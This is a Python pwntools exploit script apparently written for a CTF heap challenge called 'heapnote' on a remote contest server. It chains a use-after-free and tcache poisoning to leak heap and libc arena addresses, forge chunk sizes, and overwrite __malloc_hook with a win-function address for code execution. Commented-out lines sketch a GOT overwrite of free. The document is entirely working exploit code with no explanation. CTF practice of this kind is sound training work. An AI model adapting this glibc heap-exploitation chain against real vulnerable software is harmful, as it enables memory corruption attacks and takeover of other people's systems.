from pwn import *

conn = remote('chal.nbctf.com', 30172)

# context.terminal = 'tmux splitw -h'.split(' ')
# conn = process('./heapnote')
# gdb.attach(pidof(conn)[0], 'b *0x40163d')

context.log_level = 'debug'
libc = ELF('./libc-2.31.so')

free_addr = 0x404018
win_addr = 0x401276
free_offset = libc.functions['free'].address

def add(data:bytes):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Input note data: ', data)

def delete(idx:int):
    print('delete', idx)
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Note index (0-', str(idx).encode())

def show(idx:int):
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'Note index (0-', str(idx).encode())
    conn.recvuntil(b'): ')
    msg = conn.recvuntil(b'\n1. Create', drop=True)
    return msg

def edit(idx:int, data:bytes):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Note index (0-', str(idx).encode())
    conn.sendlineafter(b'Input note data: ', data)




for i in range(5):
    add(b'AAA')

delete(0)
delete(1)
heap_addr_raw = show(1).ljust(8, b'\x00')
heap_addr:int = u64(heap_addr_raw) & 0xfffffffff000

tcache_root = heap_addr + 0x10

print(hex(heap_addr))

edit(1, p64(heap_addr + 0x10 + 0x8) + p64(tcache_root + 0x290 + 0x50))
add(p64(0) + p64(0xa1))
# fill tcache
add(p16(7) * 16)


# anywrite without price
delete(0)
delete(1)

edit(1, p64(heap_addr + 0x290 + 0x50 * 2) + p64(tcache_root + 0x290 + 0x50))
add(p64(0) + p64(0xa1))
# # this is chunk 2, extended to 0xa1
add(p64(0) + p64(0xa1))
delete(2)

unsorted_addr:int = u64(show(2).ljust(8, b'\x00'))
arena_addr = unsorted_addr - 0x60
malloc_hook = arena_addr - 0x10
print(hex(arena_addr))

delete(0)
delete(1)
edit(1, p64(malloc_hook) + p64(tcache_root + 0x290 + 0x50))
add(p64(win_addr))
add(p64(win_addr))

# add(p64(free_addr) + p64(tcache_root))

# edit(1, p64(free_addr) + p64(tcache_root))
# add(p64(free_offset)[0:1])
# add(p64(free_offset)[0:1])


# delete(2)


conn.interactive()